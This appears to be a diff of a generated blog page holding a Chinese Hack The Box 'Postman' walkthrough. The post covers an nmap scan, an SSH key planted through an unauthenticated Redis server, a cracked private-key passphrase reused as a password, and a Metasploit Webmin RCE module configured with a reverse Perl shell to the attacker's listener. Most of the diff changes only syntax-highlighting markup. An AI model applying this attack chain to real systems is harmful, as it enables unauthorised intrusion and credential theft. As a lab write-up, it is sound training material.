@@ -2,24 +2,22 @@
 <html lang="en">
 
 <head>
-    <meta name="baidu-site-verification" content="vPxiUFV6yy" />
     <meta charset="utf-8">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="google-site-verification" content="xBT4GhYoi5qRD5tr338pgPM5OWHHIDR6mNg1a3euekI" />
     <meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover">
     <meta name="description" content="">
     <meta name="keywords"  content="">
-    <meta name="theme-color" content="">
+    <meta name="theme-color" content="#000000">
     
     <!-- Open Graph -->
     <meta property="og:title" content="Hackthebox Postman writeup/Walkthrough/攻略 - 吴警的博客 | WuJ1n9 Blog">
     
     <meta property="og:type" content="article">
     <meta property="og:description" content="0x00 简介
-
 ">
     
-    <meta property="article:published_time" content="2020-01-03T00:28:00Z">
+    <meta property="article:published_time" content="2020-01-03T08:28:00Z">
     
     
     <meta property="article:author" content="WuJ">
@@ -39,14 +37,12 @@
     <!-- Web App Manifest -->
     <link rel="manifest" href="/pwa/manifest.json">
 
+    <!-- Favicon -->
+    <link rel="shortcut icon" href="/img/favicon.ico">
+
     <!-- share.css -->
     <link rel="stylesheet" href="/css/share.min.css">
     <script src="/js/social-share.min.js"></script>
-
-    <!--link rel="stylesheet" href="/css/syntax.css"-->
-
-    <!-- Favicon -->
-    <link rel="shortcut icon" href="/img/favicon.png">
     
     <!-- Canonical URL -->
     <link rel="canonical" href="http://localhost:4000/2020/01/03/HTB-Postman/">
@@ -79,7 +75,9 @@
 <body ontouchstart="">
 
     <!-- Navigation -->
+
 <nav class="navbar navbar-default navbar-custom navbar-fixed-top">
+
     <div class="container-fluid">
         <!-- Brand and toggle get grouped for better mobile display -->
         <div class="navbar-header page-scroll">
@@ -106,6 +104,14 @@
                     <li>
                         <a href="/about/">About</a>
                     </li>
+                    
+                    
+                    
+                    <li>
+                        <a href="/archive/">Archive</a>
+                    </li>
+                    
+                    
                     
                     
                     
@@ -190,7 +196,9 @@
 
     
 </style>
+
 <header class="intro-header" >
+
     <div class="header-mask"></div>
     
     <div class="container">
@@ -245,10 +253,9 @@
 
 <p>nmap 对某一站点全面扫描 (<strong>SYN全端口扫描</strong>) 常用指令如下：</p>
 
-<div class="language-shell highlighter-rouge"><div class="highlight"><table style="border-spacing: 0"><tbody><tr><td class="gutter gl" style="text-align: right"><pre class="lineno">1</pre></td><td class="code"><pre>nmap -sS -sV -sC -T4 -v -p- 10.10.10.160
-</pre></td></tr></tbody></table>
-</div>
-</div>
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+</pre></td><td class="rouge-code"><pre>nmap <span class="nt">-sS</span> <span class="nt">-sV</span> <span class="nt">-sC</span> <span class="nt">-T4</span> <span class="nt">-v</span> <span class="nt">-p-</span> 10.10.10.160
+</pre></td></tr></tbody></table></code></pre></div></div>
 
 <blockquote>
   <p><strong>-sS:</strong>  SYN扫描是目前默认的也是最受欢迎的扫描选项</p>
@@ -266,7 +273,7 @@
   <p><strong>Other:</strong> 扫描的时候按 <code class="highlighter-rouge">d</code> 可以显示 debug 信息，按 <code class="highlighter-rouge">x</code> 可以显示当前进度</p>
 </blockquote>
 
-<div class="language-shell highlighter-rouge"><div class="highlight"><table style="border-spacing: 0"><tbody><tr><td class="gutter gl" style="text-align: right"><pre class="lineno">1
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
 2
 3
 4
@@ -285,13 +292,14 @@
 17
 18
 19
-20</pre></td><td class="code"><pre><span class="gp">root@kali:~# </span>nmap -sS -sV -sC -T4 -v -p- 10.10.10.160
+20
+</pre></td><td class="rouge-code"><pre>root@kali:~# nmap <span class="nt">-sS</span> <span class="nt">-sV</span> <span class="nt">-sC</span> <span class="nt">-T4</span> <span class="nt">-v</span> <span class="nt">-p-</span> 10.10.10.160
 Starting Nmap 7.70 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2020-01-02 21:56 CST
 Nmap scan report <span class="k">for </span>Postman <span class="o">(</span>10.10.10.160<span class="o">)</span>
-Host is up <span class="o">(</span>0.15s latency<span class="o">)</span>.
+Host is up <span class="o">(</span>0.15s latency<span class="o">)</span><span class="nb">.</span>
 Not shown: 49025 closed ports, 16506 filtered ports
 PORT      STATE SERVICE VERSION
-22/tcp    open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 <span class="o">(</span>Ubuntu Linux; protocol 2.0<span class="o">)</span>
+22/tcp    open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 <span class="o">(</span>Ubuntu Linux<span class="p">;</span> protocol 2.0<span class="o">)</span>
 | ssh-hostkey: 
 |   2048 46:83:4f:f1:38:61:c0:1c:74:cb:b5:d1:4a:68:4d:77 <span class="o">(</span>RSA<span class="o">)</span>
 |   256 2d:8d:27:d2:df:15:1a:31:53:05:fb:ff:f0:62:26:89 <span class="o">(</span>ECDSA<span class="o">)</span>
@@ -300,14 +308,12 @@ PORT      STATE SERVICE VERSION
 |_http-title: The Cyber Geek<span class="s1">'s Personal Website
 6379/tcp  open  redis   Redis key-value store 4.0.9
 10000/tcp open  http    MiniServ 1.910 (Webmin httpd)
-|_http-title: Site doesn'</span>t have a title <span class="o">(</span>text/html; <span class="nv">Charset</span><span class="o">=</span>iso-8859-1<span class="o">)</span>.
-Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+|_http-title: Site doesn'</span>t have a title <span class="o">(</span>text/html<span class="p">;</span> <span class="nv">Charset</span><span class="o">=</span>iso-8859-1<span class="o">)</span><span class="nb">.</span>
+Service Info: OS: Linux<span class="p">;</span> CPE: cpe:/o:linux:linux_kernel
 
-Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ <span class="nb">.</span>
 <span class="c"># Nmap done at Thu Nov 28 05:28:35 2019 -- 1 IP address (1 host up) scanned in 89.52 seconds</span>
-</pre></td></tr></tbody></table>
-</div>
-</div>
+</pre></td></tr></tbody></table></code></pre></div></div>
 
 <p>发现开放了4个端口， 80 端口在查看页面和扫描目录后未发现特别明显的漏洞，先继续看看后面两个端口。</p>
 
@@ -372,22 +378,21 @@ ssh -i /root/.ssh/id_rsa redis@10.10.10.160
 
 <p><a href="https://juejin.im/post/58d4e31aa22b9d00645634fc">Redis 主从复制常见问题</a></p>
 
-<div class="highlighter-rouge"><div class="highlight"><table style="border-spacing: 0"><tbody><tr><td class="gutter gl" style="text-align: right"><pre class="lineno">1
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
 2
 3
 4
 5
 6
-7</pre></td><td class="code"><pre>10.10.10.160:6379&gt; set key "\n\nssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC5H80/PWYu0XeLVEQchqCtinGauFmpNPWJ//IkaeqceSE3YL6QeY33ipgkskpe1R/29jKhLJIkP0ku9ozPW9kIlz4HCDPm2C1V3tnaFAMz6P96HBGrd1XDa0cTjOkOgkeAW/YW0STn3pfjAUYXd3pIkQiD1zgkYvs2Y/Jkk+8BZ9+9nmSQkX7ic4jCwBF+HVlg4uGqK/McInB/LWNhnonRuQ0mx/IG2nSmWTX+EoFmWGyY8r2ODRr8MkxX5s9eBqhR94EiArsatHHN+Z2jWA8QhGqXliE/uQtXN42fU8P8G+VqpsADu8ZnblvTfSsVptSe0Fs6V63J1AUike9G1ejH root@kali\n\n"
+7
+</pre></td><td class="rouge-code"><pre>10.10.10.160:6379&gt; set key "\n\nssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC5H80/PWYu0XeLVEQchqCtinGauFmpNPWJ//IkaeqceSE3YL6QeY33ipgkskpe1R/29jKhLJIkP0ku9ozPW9kIlz4HCDPm2C1V3tnaFAMz6P96HBGrd1XDa0cTjOkOgkeAW/YW0STn3pfjAUYXd3pIkQiD1zgkYvs2Y/Jkk+8BZ9+9nmSQkX7ic4jCwBF+HVlg4uGqK/McInB/LWNhnonRuQ0mx/IG2nSmWTX+EoFmWGyY8r2ODRr8MkxX5s9eBqhR94EiArsatHHN+Z2jWA8QhGqXliE/uQtXN42fU8P8G+VqpsADu8ZnblvTfSsVptSe0Fs6V63J1AUike9G1ejH root@kali\n\n"
 (error) READONLY You can't write against a read only slave.
 10.10.10.160:6379&gt; SLAVEOF no one
 OK
 10.10.10.160:6379&gt; set key "\n\nssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC5H80/PWYu0XeLVEQchqCtinGauFmpNPWJ//IkaeqceSE3YL6QeY33ipgkskpe1R/29jKhLJIkP0ku9ozPW9kIlz4HCDPm2C1V3tnaFAMz6P96HBGrd1XDa0cTjOkOgkeAW/YW0STn3pfjAUYXd3pIkQiD1zgkYvs2Y/Jkk+8BZ9+9nmSQkX7ic4jCwBF+HVlg4uGqK/McInB/LWNhnonRuQ0mx/IG2nSmWTX+EoFmWGyY8r2ODRr8MkxX5s9eBqhR94EiArsatHHN+Z2jWA8QhGqXliE/uQtXN42fU8P8G+VqpsADu8ZnblvTfSsVptSe0Fs6V63J1AUike9G1ejH root@kali\n\n"
 OK
 (0.95s)
-</pre></td></tr></tbody></table>
-</div>
-</div>
+</pre></td></tr></tbody></table></code></pre></div></div>
 
 <h2 id="0x03-usertxt">0x03 User.txt</h2>
 
@@ -397,7 +402,7 @@ OK
 
 <p>通过 <code class="highlighter-rouge">base64</code> 和 <code class="highlighter-rouge">base64 -d</code> 将文件拷贝到本地 kali，命名为 Mattssh_bak</p>
 
-<div class="language-shell highlighter-rouge"><div class="highlight"><table style="border-spacing: 0"><tbody><tr><td class="gutter gl" style="text-align: right"><pre class="lineno">1
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
 2
 3
 4
@@ -431,10 +436,11 @@ OK
 32
 33
 34
-35</pre></td><td class="code"><pre><span class="gp">redis@Postman:/var$ </span><span class="nb">cd</span> /opt
-<span class="gp">redis@Postman:/opt$ </span>ls
-id_rsa.bak
-<span class="gp">redis@Postman:/opt$ </span>base64 id_rsa.bak 
+35
+</pre></td><td class="rouge-code"><pre>redis@Postman:/var<span class="nv">$ </span><span class="nb">cd</span> /opt
+redis@Postman:/opt<span class="nv">$ </span><span class="nb">ls
+</span>id_rsa.bak
+redis@Postman:/opt<span class="nv">$ </span><span class="nb">base64 </span>id_rsa.bak 
 LS0tLS1CRUdJTiBSU0EgUFJJVkFURSBLRVktLS0tLQpQcm9jLVR5cGU6IDQsRU5DUllQVEVECkRF
 Sy1JbmZvOiBERVMtRURFMy1DQkMsNzNFOUNFRkJDQ0Y1Mjg3QwoKSmVoQTUxSTE3cnNDT09WcXlX
 eCtDODM2M0lPQllYUTExRGR3L3ByM0wyQTJORHRCN3R2c1hOeXFLRGdoZlFuWApjd0dKSlVEOWtL
@@ -466,20 +472,17 @@ a2swcmJiNm12RjhnU3FMUWc3V3BiWkZ5dGdTMDVUcFBaUE0waDh0UkU4WVJkSmhlV3JRClZjTnla
 SDhPSFlxRVM0ZzJVRjYyS3B0dHFTd0xpaUY0dXRIcSsvaDVDUXdzRitKUmc4OGJueGgyejJCRDZp
 NVcKWCtoSzVIUHBwNlFualo4QTVFUnVVRUdhWkJFVXZHSnRQR0hqWnlMcGt5dE1oVGphT3JSTll3
 PT0KLS0tLS1FTkQgUlNBIFBSSVZBVEUgS0VZLS0tLS0K
-</pre></td></tr></tbody></table>
-</div>
-</div>
+</pre></td></tr></tbody></table></code></pre></div></div>
 
-<div class="language-shell highlighter-rouge"><div class="highlight"><table style="border-spacing: 0"><tbody><tr><td class="gutter gl" style="text-align: right"><pre class="lineno">1
-2</pre></td><td class="code"><pre>root@kali:~/Desktop/ <span class="nb">echo</span> -n <span class="s2">"LS0tLS1CRUdJTiBSU0EgUFJJVkFURSBLRVktLS0tLQpQcm9jLVR5cGU6IDQsRU5DUllQVEVECkRFSy1JbmZvOiBERVMtRURFMy1DQkMsNzNFOUNFRkJDQ0Y1Mjg3QwoKSmVoQTUxSTE3cnNDT09WcXlXeCtDODM2M0lPQllYUTExRGR3L3ByM0wyQTJORHRCN3R2c1hOeXFLRGdoZlFuWApjd0dKSlVEOWtLSm5pSmtKenJ2RjFXZXB2TU5rajlaSXRYUXpZTjh3Ympscmt1MWJKcTV4bkpYOUVVYjVJN2syCjdHc1R3c012S3pYa2tmRVpRYVhLL1Q1MHMzSTRDZGNmYnIxZFhJeWFiWExMcFpPaVpFS3ZyNCtLeVNqcDRvdTYKY2RuQ1doemtBL1R3SnBYRzFXZU9tTXZ0Q1pXMUhDQnV0WXNOUDZCRGY3OGJRR21tbGlycVJtWGZMQjkySmhUOQoxdThKekhDSjF6Wk1HNXZhVXR2b24wcWdQeDd4ZUlVTzZMQUZUb3pyTjlNR1dFcUJFSjV6TVZycnQzVEdWa2N2CkV5dmxXd2tzN1IvZ2p4SHlVd1QrYTVMQ0dHU2pWRDg1THhZdXRnV3hPVUtidFdHQmJVOHlpN1lzWGxLQ3d3SFAKVUg3T2ZRejAzVld5K0swYWE4UXMrRXl3Nlgzd2JXbnVlMDNuZy9zTEpuSjcyOXpiM2t1eW04citoVSs5djZWWQpTaitRbmpWVFlqRGZuVDIyakpCVUhUVjJ5cktlQXo2Q1hkRlQreEloeEVBaXYwbTFaa2t5UWtXcFVpQ3p5dVlLCnQrTVN0d1d0U3QwVko0VTFOYTJHM3hHUGptcmttandYdnVkS0MwWU4vT0JvUFBPVGFCVkQ5aTZmc29aNnB3blMKNU1pOEJ6ckJoZE8wd0hhRGNUWVBjM0IwMEN3cUFWNU1YbWtBazJ6S0wwVzJ0ZFZZa3NLd3hLQ3dHbVdscGRrZQpQMkpHbHA5TFdFZXJNZm9sYmpUU09VNW1EZVBmTVEzZndDTzZNUEJpcXpyckZjUE5KcjcvTWNRRUNiNXNmK082CmpLRTNKZm4wVVZFMlFWZFZLM29FTDZEeWFCZi9XMmQvM1Q3cTEwVWQ3Sys0S2QzNmd4TUJmMzNFYTYrcXgzR2UKU2JKSWhrc3c1VEtoZDUwNUFpVUgyVG44OXFOR2VjVkpFYmpLZUovdkZaQzVZSXNRKzlzbDg5VG1KSEw3NFkzaQpsM1lYREVzUWpoWkh4WDVYL1JVMDJEK0FGMDdwM0JTUmpoRDMwY2pqMHV1V2tLb3dwb28wWTBlYmxnbWQ3bzJYCjBWSVdyc2tQSzRJN0lINWdia3J4VkdiLzlnL1cydWExQzNObmN2M01OY2YwbmxJMTE3QlMvUXdOdHVUb3pHOHAKUzlrM2xpK3JZcjZmM21hL1VMc1VuS2labHM4U3BVK1JzYW9zTEdLWjZwMm9JZThvUlNtbE9Dc1kwSUNxN2VSUgpoa3V6VXVIOXovbUJvMnRRV2g4cXZUb0NTRWpnOHlOTzl6OCtMZG9OMXdRV01QYVZ3UkJqSXl4Q1BIRlRKM3UrClp4eTB0SVB3akNadnhVZlluL0s0RlZIYXZ2QStiOWxvcG5VQ0VBRVJwd0l2OCt0WW9md0dWcExWQzBEck41OFYKWFRmQjJYOXNMMW9CM2hPNG1KRjBaM3lKMktaRWRZd0hHdXFOVEZhZ04wZ0JjeU5JMndzeFpOeklLMjZ2UHJPRApiNkJjOVVkaVdDWnFNS1V4NGFNVExoRzVST2pnUUd5dFdmL3E3TUdyTzNjRjI1azFQRVdOeVpNcVk0V1lzWlhpCldoUUZIa0ZPSU53VkVPdEhha1ovVG9ZYVVRTnRSVDZwWnlIZ3ZqVDBtVG8wdDNqVUVSc3BwajFwd2JnZ0NHbWgKS1RrbWhLK01UYW95ODlDZzBYdzJKMThEbTBvNzhwNlVOcmtTdWUxQ3NXakVmRUlGM05BTUVVMm8rTmdxOTJIbQpucEFGUmV0dndRN3h1a2swcmJiNm12RjhnU3FMUWc3V3BiWkZ5dGdTMDVUcFBaUE0waDh0UkU4WVJkSmhlV3JRClZjTnlaSDhPSFlxRVM0ZzJVRjYyS3B0dHFTd0xpaUY0dXRIcSsvaDVDUXdzRitKUmc4OGJueGgyejJCRDZpNVcKWCtoSzVIUHBwNlFualo4QTVFUnVVRUdhWkJFVXZHSnRQR0hqWnlMcGt5dE1oVGphT3JSTll3PT0KLS0tLS1FTkQgUlNBIFBSSVZBVEUgS0VZLS0tLS0K"</span> | base64 -d &gt; Mattssh_bak 
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+</pre></td><td class="rouge-code"><pre>root@kali:~/Desktop/ <span class="nb">echo</span> <span class="nt">-n</span> <span class="s2">"LS0tLS1CRUdJTiBSU0EgUFJJVkFURSBLRVktLS0tLQpQcm9jLVR5cGU6IDQsRU5DUllQVEVECkRFSy1JbmZvOiBERVMtRURFMy1DQkMsNzNFOUNFRkJDQ0Y1Mjg3QwoKSmVoQTUxSTE3cnNDT09WcXlXeCtDODM2M0lPQllYUTExRGR3L3ByM0wyQTJORHRCN3R2c1hOeXFLRGdoZlFuWApjd0dKSlVEOWtLSm5pSmtKenJ2RjFXZXB2TU5rajlaSXRYUXpZTjh3Ympscmt1MWJKcTV4bkpYOUVVYjVJN2syCjdHc1R3c012S3pYa2tmRVpRYVhLL1Q1MHMzSTRDZGNmYnIxZFhJeWFiWExMcFpPaVpFS3ZyNCtLeVNqcDRvdTYKY2RuQ1doemtBL1R3SnBYRzFXZU9tTXZ0Q1pXMUhDQnV0WXNOUDZCRGY3OGJRR21tbGlycVJtWGZMQjkySmhUOQoxdThKekhDSjF6Wk1HNXZhVXR2b24wcWdQeDd4ZUlVTzZMQUZUb3pyTjlNR1dFcUJFSjV6TVZycnQzVEdWa2N2CkV5dmxXd2tzN1IvZ2p4SHlVd1QrYTVMQ0dHU2pWRDg1THhZdXRnV3hPVUtidFdHQmJVOHlpN1lzWGxLQ3d3SFAKVUg3T2ZRejAzVld5K0swYWE4UXMrRXl3Nlgzd2JXbnVlMDNuZy9zTEpuSjcyOXpiM2t1eW04citoVSs5djZWWQpTaitRbmpWVFlqRGZuVDIyakpCVUhUVjJ5cktlQXo2Q1hkRlQreEloeEVBaXYwbTFaa2t5UWtXcFVpQ3p5dVlLCnQrTVN0d1d0U3QwVko0VTFOYTJHM3hHUGptcmttandYdnVkS0MwWU4vT0JvUFBPVGFCVkQ5aTZmc29aNnB3blMKNU1pOEJ6ckJoZE8wd0hhRGNUWVBjM0IwMEN3cUFWNU1YbWtBazJ6S0wwVzJ0ZFZZa3NLd3hLQ3dHbVdscGRrZQpQMkpHbHA5TFdFZXJNZm9sYmpUU09VNW1EZVBmTVEzZndDTzZNUEJpcXpyckZjUE5KcjcvTWNRRUNiNXNmK082CmpLRTNKZm4wVVZFMlFWZFZLM29FTDZEeWFCZi9XMmQvM1Q3cTEwVWQ3Sys0S2QzNmd4TUJmMzNFYTYrcXgzR2UKU2JKSWhrc3c1VEtoZDUwNUFpVUgyVG44OXFOR2VjVkpFYmpLZUovdkZaQzVZSXNRKzlzbDg5VG1KSEw3NFkzaQpsM1lYREVzUWpoWkh4WDVYL1JVMDJEK0FGMDdwM0JTUmpoRDMwY2pqMHV1V2tLb3dwb28wWTBlYmxnbWQ3bzJYCjBWSVdyc2tQSzRJN0lINWdia3J4VkdiLzlnL1cydWExQzNObmN2M01OY2YwbmxJMTE3QlMvUXdOdHVUb3pHOHAKUzlrM2xpK3JZcjZmM21hL1VMc1VuS2labHM4U3BVK1JzYW9zTEdLWjZwMm9JZThvUlNtbE9Dc1kwSUNxN2VSUgpoa3V6VXVIOXovbUJvMnRRV2g4cXZUb0NTRWpnOHlOTzl6OCtMZG9OMXdRV01QYVZ3UkJqSXl4Q1BIRlRKM3UrClp4eTB0SVB3akNadnhVZlluL0s0RlZIYXZ2QStiOWxvcG5VQ0VBRVJwd0l2OCt0WW9md0dWcExWQzBEck41OFYKWFRmQjJYOXNMMW9CM2hPNG1KRjBaM3lKMktaRWRZd0hHdXFOVEZhZ04wZ0JjeU5JMndzeFpOeklLMjZ2UHJPRApiNkJjOVVkaVdDWnFNS1V4NGFNVExoRzVST2pnUUd5dFdmL3E3TUdyTzNjRjI1azFQRVdOeVpNcVk0V1lzWlhpCldoUUZIa0ZPSU53VkVPdEhha1ovVG9ZYVVRTnRSVDZwWnlIZ3ZqVDBtVG8wdDNqVUVSc3BwajFwd2JnZ0NHbWgKS1RrbWhLK01UYW95ODlDZzBYdzJKMThEbTBvNzhwNlVOcmtTdWUxQ3NXakVmRUlGM05BTUVVMm8rTmdxOTJIbQpucEFGUmV0dndRN3h1a2swcmJiNm12RjhnU3FMUWc3V3BiWkZ5dGdTMDVUcFBaUE0waDh0UkU4WVJkSmhlV3JRClZjTnlaSDhPSFlxRVM0ZzJVRjYyS3B0dHFTd0xpaUY0dXRIcSsvaDVDUXdzRitKUmc4OGJueGgyejJCRDZpNVcKWCtoSzVIUHBwNlFualo4QTVFUnVVRUdhWkJFVXZHSnRQR0hqWnlMcGt5dE1oVGphT3JSTll3PT0KLS0tLS1FTkQgUlNBIFBSSVZBVEUgS0VZLS0tLS0K"</span> | <span class="nb">base64</span> <span class="nt">-d</span> <span class="o">&gt;</span> Mattssh_bak 
 
-</pre></td></tr></tbody></table>
-</div>
-</div>
+</pre></td></tr></tbody></table></code></pre></div></div>
 
 <p>和上一篇博客一样，之后在本机使用 ssh2john 将密钥转换为可破解的哈希格式，再使用 john 的自带字典进行 passphrase 的爆破</p>
 
-<div class="language-shell highlighter-rouge"><div class="highlight"><table style="border-spacing: 0"><tbody><tr><td class="gutter gl" style="text-align: right"><pre class="lineno">1
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
 2
 3
 4
@@ -491,8 +494,9 @@ PT0KLS0tLS1FTkQgUlNBIFBSSVZBVEUgS0VZLS0tLS0K
 10
 11
 12
-13</pre></td><td class="code"><pre><span class="gp">root@kali:~/home# </span>ssh2john Mattssh_bak &gt; matthash
-<span class="gp">root@kali:~/home# </span>john --wordlist<span class="o">=</span>/usr/share/wordlists/rockyou.txt matthash
+13
+</pre></td><td class="rouge-code"><pre>root@kali:~/home# ssh2john Mattssh_bak <span class="o">&gt;</span> matthash
+root@kali:~/home# john <span class="nt">--wordlist</span><span class="o">=</span>/usr/share/wordlists/rockyou.txt matthash
 Using default input encoding: UTF-8
 Loaded 1 password <span class="nb">hash</span> <span class="o">(</span>SSH <span class="o">[</span>RSA/DSA/EC/OPENSSH <span class="o">(</span>SSH private keys<span class="o">)</span> 32/64]<span class="o">)</span>
 Cost 1 <span class="o">(</span>KDF/cipher <span class="o">[</span><span class="nv">0</span><span class="o">=</span>MD5/AES <span class="nv">1</span><span class="o">=</span>MD5/3DES <span class="nv">2</span><span class="o">=</span>Bcrypt/AES]<span class="o">)</span> is 1 <span class="k">for </span>all loaded hashes
@@ -504,28 +508,25 @@ Press <span class="s1">'q'</span> or Ctrl-C to abort, almost any other key <span
 computer2008     <span class="o">(</span>Matts.key<span class="o">)</span>
 1g 0:00:00:01 10.16% <span class="o">(</span>ETA: 04:52:13<span class="o">)</span> 0.5319g/s 862502p/s 862502c/s 862502C/s kifra9..kieukieu
 Session aborted
-</pre></td></tr></tbody></table>
-</div>
-</div>
+</pre></td></tr></tbody></table></code></pre></div></div>
 
 <p>得到 ssh 的密钥 <code class="highlighter-rouge">computer2008</code>，但直接使用 ssh 无法成功登录，毕竟这是备份密钥，可能已经无法使用。但 <code class="highlighter-rouge">computer2008</code> 作为 Matt 的一个密码可能会被重用在别的地方。先登录 redis 用户，再切换用户，尝试将密码输入，bingo!</p>
 
-<div class="language-shell highlighter-rouge"><div class="highlight"><table style="border-spacing: 0"><tbody><tr><td class="gutter gl" style="text-align: right"><pre class="lineno">1
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
 2
 3
 4
 5
 6
-7</pre></td><td class="code"><pre><span class="gp">redis@Postman:~$ </span>su Matt
+7
+</pre></td><td class="rouge-code"><pre>redis@Postman:~<span class="nv">$ </span>su Matt
 Password: 
-<span class="gp">Matt@Postman:/var/lib/redis$ </span>whoami
-Matt
-<span class="gp">Matt@Postman:/var/lib/redis$ </span><span class="nb">cd
-</span><span class="gp">Matt@Postman:~$ </span>ls
-user.txt
-</pre></td></tr></tbody></table>
-</div>
-</div>
+Matt@Postman:/var/lib/redis<span class="nv">$ </span><span class="nb">whoami
+</span>Matt
+Matt@Postman:/var/lib/redis<span class="nv">$ </span><span class="nb">cd
+</span>Matt@Postman:~<span class="nv">$ </span><span class="nb">ls
+</span>user.txt
+</pre></td></tr></tbody></table></code></pre></div></div>
 
 <h2 id="0x04-roottxt">0x04 Root.txt</h2>
 
@@ -541,7 +542,7 @@ user.txt
 
 <p>发现 msf 已经集成了针对该版本可利用的 exploit</p>
 
-<div class="language-shell highlighter-rouge"><div class="highlight"><table style="border-spacing: 0"><tbody><tr><td class="gutter gl" style="text-align: right"><pre class="lineno">1
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
 2
 3
 4
@@ -587,13 +588,14 @@ user.txt
 44
 45
 46
-47</pre></td><td class="code"><pre>msf5 &gt; search webmin
+47
+</pre></td><td class="rouge-code"><pre>msf5 <span class="o">&gt;</span> search webmin
 
 Matching Modules
 <span class="o">================</span>
 
    <span class="c">#  Name                                         Disclosure Date  Rank       Check  Description</span>
-   -  ----                                         ---------------  ----       -----  -----------
+   -  <span class="nt">----</span>                                         <span class="nt">---------------</span>  <span class="nt">----</span>       <span class="nt">-----</span>  <span class="nt">-----------</span>
    0  auxiliary/admin/webmin/edit_html_fileaccess  2012-09-06       normal     No     Webmin edit_html.cgi file Parameter Traversal Arbitrary File Access
    1  auxiliary/admin/webmin/file_disclosure       2006-06-30       normal     No     Webmin File Disclosure
    2  exploit/linux/http/webmin_packageup_rce      2019-05-16       excellent  Yes    Webmin Package Updates Remote Command Execution
@@ -602,45 +604,43 @@ Matching Modules
    5  exploit/unix/webapp/webmin_upload_exec       2019-01-17       excellent  Yes    Webmin Upload Authenticated RCE
 
 
-msf5 &gt; use exploit/linux/http/webmin_packageup_rce
+msf5 <span class="o">&gt;</span> use exploit/linux/http/webmin_packageup_rce
 
-msf5 exploit<span class="o">(</span>linux/http/webmin_packageup_rce<span class="o">)</span> &gt; show options 
+msf5 exploit<span class="o">(</span>linux/http/webmin_packageup_rce<span class="o">)</span> <span class="o">&gt;</span> show options 
 
 Module options <span class="o">(</span>exploit/linux/http/webmin_packageup_rce<span class="o">)</span>:
 
    Name       Current Setting  Required  Description
-   ----       ---------------  --------  -----------
-   PASSWORD   computer2008     yes       Webmin Password
+   <span class="nt">----</span>       <span class="nt">---------------</span>  <span class="nt">--------</span>  <span class="nt">-----------</span>
+   PASSWORD   computer2008     <span class="nb">yes       </span>Webmin Password
    Proxies                     no        A proxy chain of format <span class="nb">type</span>:host:port[,type:host:port][...]
-   RHOSTS     10.10.10.160     yes       The target host<span class="o">(</span>s<span class="o">)</span>, range CIDR identifier, or hosts file with syntax <span class="s1">'file:&lt;path&gt;'</span>
-   RPORT      10000            yes       The target port <span class="o">(</span>TCP<span class="o">)</span>
+   RHOSTS     10.10.10.160     <span class="nb">yes       </span>The target host<span class="o">(</span>s<span class="o">)</span>, range CIDR identifier, or hosts file with syntax <span class="s1">'file:&lt;path&gt;'</span>
+   RPORT      10000            <span class="nb">yes       </span>The target port <span class="o">(</span>TCP<span class="o">)</span>
    SSL        <span class="nb">true             </span>no        Negotiate SSL/TLS <span class="k">for </span>outgoing connections
-   TARGETURI  /                yes       Base path <span class="k">for </span>Webmin application
-   USERNAME   Matt             yes       Webmin Username
+   TARGETURI  /                <span class="nb">yes       </span>Base path <span class="k">for </span>Webmin application
+   USERNAME   Matt             <span class="nb">yes       </span>Webmin Username
    VHOST                       no        HTTP server virtual host
 
 
 Payload options <span class="o">(</span>cmd/unix/reverse_perl<span class="o">)</span>:
 
    Name   Current Setting  Required  Description
-   ----   ---------------  --------  -----------
-   LHOST  10.10.15.44      yes       The listen address <span class="o">(</span>an interface may be specified<span class="o">)</span>
-   LPORT  4444             yes       The listen port
+   <span class="nt">----</span>   <span class="nt">---------------</span>  <span class="nt">--------</span>  <span class="nt">-----------</span>
+   LHOST  10.10.15.44      <span class="nb">yes       </span>The listen address <span class="o">(</span>an interface may be specified<span class="o">)</span>
+   LPORT  4444             <span class="nb">yes       </span>The listen port
 
 
 Exploit target:
 
    Id  Name
-   --  ----
+   <span class="nt">--</span>  <span class="nt">----</span>
    0   Webmin &lt;<span class="o">=</span> 1.910
 
-</pre></td></tr></tbody></table>
-</div>
-</div>
+</pre></td></tr></tbody></table></code></pre></div></div>
 
 <p>设置好选项，注意 SSL 选项需要设置为 true</p>
 
-<div class="language-shell highlighter-rouge"><div class="highlight"><table style="border-spacing: 0"><tbody><tr><td class="gutter gl" style="text-align: right"><pre class="lineno">1
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
 2
 3
 4
@@ -652,22 +652,21 @@ Exploit target:
 10
 11
 12
-13</pre></td><td class="code"><pre>msf5 exploit<span class="o">(</span>linux/http/webmin_packageup_rce<span class="o">)</span> &gt; run
+13
